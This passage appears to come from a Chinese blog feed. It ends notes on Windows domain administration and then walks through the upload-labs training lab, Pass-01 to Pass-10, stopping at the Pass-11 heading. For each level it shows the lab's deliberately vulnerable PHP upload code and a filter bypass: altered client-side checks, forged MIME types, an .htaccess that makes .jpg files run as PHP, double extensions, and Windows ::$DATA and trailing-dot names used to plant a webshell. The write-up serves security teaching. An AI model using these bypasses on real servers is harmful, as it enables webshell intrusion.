src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.35.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.55.49.png" alt="image"></p><p><strong>注：</strong><br>集中身份验证，其实就是一次性对一个组的成员进行共享授权</p><p>把域用户添加到本地管理员组</p><p>域管理员默认是本地管理员组内成员</p><h3 id="0x07-使用组策略集中管理用户和计算机"><a href="#0x07-使用组策略集中管理用户和计算机" class="headerlink" title="0x07 使用组策略集中管理用户和计算机"></a>0x07 使用组策略集中管理用户和计算机</h3><hr><p>强制更新组策略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gpupdate /force</div></pre></td></tr></table></figure></p><p>计算机开机首先会到DC查看计算机所在组的组策略</p><p>用户登录时，计算机会向DC查看用户所属组的组策略</p><p>使用组策略部署软件时，只能部署msi结尾的文件</p><p>使用组策略管理器可以设置使普通域账户也可以登录DC</p><p>域中可以部署多台DC实现容错，但要注意DNS也要实现容错并且在域中的计算机上要设置多个DNS</p><p>活动目录站点可以控制站点之间的复制，进而优化两个使用VPN链接的域之间的用户登录等问题</p><h3 id="0x08-域中主控"><a href="#0x08-域中主控" class="headerlink" title="0x08 域中主控"></a>0x08 域中主控</h3><hr><p>PDC：防止站点名的重复；加快密码同步</p><p>RID主控：RID块，限制一次创建用户的数量</p><p>基础架构主控：负责更新其它域中对某个对象的引用</p><p>注：一个域中的第一个DC默认负责以上三个功能</p><p>强制某个DC成为域中的PDC/RID/基础架构主控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil命令的使用</div></pre></td></tr></table></figure><p>注：前提是此域林中的PDC域控坏掉了或者链接不上了</p><h3 id="0x09-附录"><a href="#0x09-附录" class="headerlink" title="0x09 附录"></a>0x09 附录</h3><p>推荐：</p><p><a href="http://edu.51cto.com/center/course/lesson/index?id=46874" target="_blank" rel="external">基础视频课程</a></p><p><a href="http://docs.ioin.in/writeup/xianzhi.aliyun.com/_forum_read_805_html/index.html" target="_blank" rel="external">域渗透基础简单信息收集（基础篇）</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>文件上传漏洞天书</title>
      <link href="/2018/06/18/upload-labs-note/"/>
      <url>/2018/06/18/upload-labs-note/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="external">upload-labs</a>来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。</p><h3 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01 Pass-01"></a>0x01 Pass-01</h3><p>这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。</p><h4 id="1-禁用js"><a href="#1-禁用js" class="headerlink" title="(1) 禁用js"></a>(1) 禁用js</h4><p>firefox和chrome均有禁用js设置，禁用了就可以绕过。</p><h4 id="2-上传按钮处修改"><a href="#2-上传按钮处修改" class="headerlink" title="(2) 上传按钮处修改"></a>(2) 上传按钮处修改</h4><p>打开web控制台删除如图所示处的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onsubmit=<span class="string">"return checkFile()"</span></div></pre></td></tr></table></figure></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png" alt=""></p><h4 id="3-构造上传点"><a href="#3-构造上传点" class="headerlink" title="(3) 构造上传点"></a>(3) 构造上传点</h4><p>与2的原理是相同的，使用了和原来代码一样但是不包含<code>onsubmit=&quot;return checkFile()&quot;</code>这句代码</p><p>Like</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-php<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"upload_panel"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传区<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"此处填写完整的上传点URL"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><h4 id="4-修改js代码"><a href="#4-修改js代码" class="headerlink" title="(4) 修改js代码"></a>(4) 修改js代码</h4><p>只需要修改js代码中的限制，让其包含你想上传的后缀名即可。</p><p>此处我们在checkFile()函数中的allow_ext变量中加入.php，之后在console run一下这段代码，随后上传便可成功。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</div><div class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</div><div class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//定义允许上传的文件类型</span></div><div class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif.|.php"</span>;</div><div class="line">    <span class="comment">//提取上传文件的类型</span></div><div class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</div><div class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></div><div class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</div><div class="line">        alert(errMsg);</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>####(5) 神器burp</p><p>先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.14.06.png" alt="image"></p><h3 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02 Pass-02"></a>0x02 Pass-02</h3><p>查看代码发现是在服务端对文件的mime类型进行了校验。对于这种情况我们只需要使用burp抓包并修改content-type字段的内容即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        <span class="comment">// 以下这个判断是在对上传文件的mime类型做判断</span></div><div class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.23.57.png" alt="image"></p><h3 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03 Pass-03"></a>0x03 Pass-03</h3><p>看了下代码发现黑名单对常见文件名进行了过滤，但是类似于”.php5”,”.php4”,”.php3”,”.php2”,”php1”这样的也是可以被当做php进行解析的。所以我们这时只需要将文件名修改为.php5就可以成功上传shell<br>注: 这个也是要服务器支持的，如果发现不能解析可以在apache配置文件中添加如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType Application/x-httpd-php .php .php3 .php5 .html</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.09.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.21.png" alt="image"></p><h3 id="0x04-Pass-04"><a href="#0x04-Pass-04" class="headerlink" title="0x04 Pass-04"></a>0x04 Pass-04</h3><p>先看下代码，此处过滤的很严，所以此时要考虑下apache的解析特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>先介绍下.htaccess文件:</p><p>(1) .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p><p>(2) .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p><p>(3) .htaccess的用途范围主要针对当前目录。</p><p>由上面可知在此处我们可以先上传一个.htaccess文件，来使apache可以将jpg文件当做php文件解析，但要注意并不是任何时候都可以上传一个有效的.htaccess文件的，在让.htaccess文件生效之前我们需要做两点配置：</p><p>(1) 修改httpd.conf，启用AllowOverride，即将如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride None</div></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride All</div></pre></td></tr></table></figure><p>(2) 修改httpd.conf，增加如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LoadModule rewrite_module modules/mod_rewrite.so</div></pre></td></tr></table></figure><p>第一步: 在.htaccess文件中写入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .jpg</div></pre></td></tr></table></figure><p>上传.htaccess<br>第二步: 修改shell.php为shell.jpg然后访问即可发现服务器对其进行了解析</p><p>注: 此处的方法在Pass-03中也是可以使用的</p><h3 id="0x05-Pass-05"><a href="#0x05-Pass-05" class="headerlink" title="0x05 Pass-05"></a>0x05 Pass-05</h3><p>首先分析代码，我们可以看到这句<code>$file_ext = strrchr($file_name, &#39;.&#39;);</code>中的<code>strrchr()</code>函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。</p><p>又考虑到apache的1.x版本和2.x版本是存在解析漏洞的，即“当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。比如 1.php.rar.ss.aa 会被当做PHP脚本执行”。</p><p>所以在此我们只需要将我们shell.php的名称修改为shell.php.ace.aaa，然后上传即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8812.54.13.png" alt="image"></p><p>注: 此处的黑名单是没有完全过滤的，并且在此处也没有将上传文件名转换为小写，比如形如shell.phP就可以达到上传绕过的目的</p><h3 id="0x06-Pass-06"><a href="#0x06-Pass-06" class="headerlink" title="0x06 Pass-06"></a>0x06 Pass-06</h3><p>从代码可以看到过滤的可以说很严了，所以这个时候我们要考虑下操作系统的特性，此处前18题均使用Windows操作系统，而Windows操作系统对文件的命名规则是有特点的，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">   　　test.asp.</div><div class="line">   　　test.asp(空格)</div><div class="line">   　　test.php:1.jpg</div><div class="line">   　　test.php:: $DATA</div></pre></td></tr></table></figure><p>但是在此处代码过滤了’.’和’::$DATA’所以我们只能使用中间那两种方式。<br>注: 会被windows系统自动去掉不符合规则符号后面的内容<br>在此处使用burp抓包修改上传即可<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.14.55.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.15.09.png" alt="image"></p><h3 id="0x07-Pass-07"><a href="#0x07-Pass-07" class="headerlink" title="0x07 Pass-07"></a>0x07 Pass-07</h3><p>此题bypass上传的原理与Pass-06相同，此处我们尝试下上传test.php .这种格式的文件，这种格式的文件在上传到Windows上之后文件中最后一个点会被去掉，所以你访问<code>test.php .</code>和访问<code>test.php</code>的效果是一样的。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.36.04.png" alt="image"></p><h3 id="0x08-Pass-08"><a href="#0x08-Pass-08" class="headerlink" title="0x08 Pass-08"></a>0x08 Pass-08</h3><p>此题发现相较于Pass-07而言对<code>::$DATA</code>没有进行过滤，所以原理已经在Pass-06讲过了，在此处我们直接上传<code>test.php:: $DATA</code><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.45.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.47.38.png" alt="image"></p><h3 id="0x09-Pass-09"><a href="#0x09-Pass-09" class="headerlink" title="0x09 Pass-09"></a>0x09 Pass-09</h3><p>此题相较于Pass-07就多了下面这一行代码，所以我们可以采用与上原理相同的方式，构造<code>test.php. .</code>进行上传绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$file_name = deldot($file_name);//删除文件名末尾的点</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.56.55.png" alt="image"></p><h3 id="0x10-Pass-10"><a href="#0x10-Pass-10" class="headerlink" title="0x10 Pass-10"></a>0x10 Pass-10</h3><p>首先分析下代码，可以看到问题出现在第8行的<code>str_ireplace()</code>函数，此函数在此的作用是对<code>$file_name</code>变量中含有<code>$deny_ext</code>内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似<code>test.pphphp</code>这样的文件，上传后文件会自动被修改为<code>test.php</code>进而成功上传shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</div><div class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.12.33.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.14.07.png" alt="image"></p><h3 id="0x11-Pass-11"><a href="#0x11-Pass-11" class="headerlink" title="0x11 Pass-11"></a>0x11 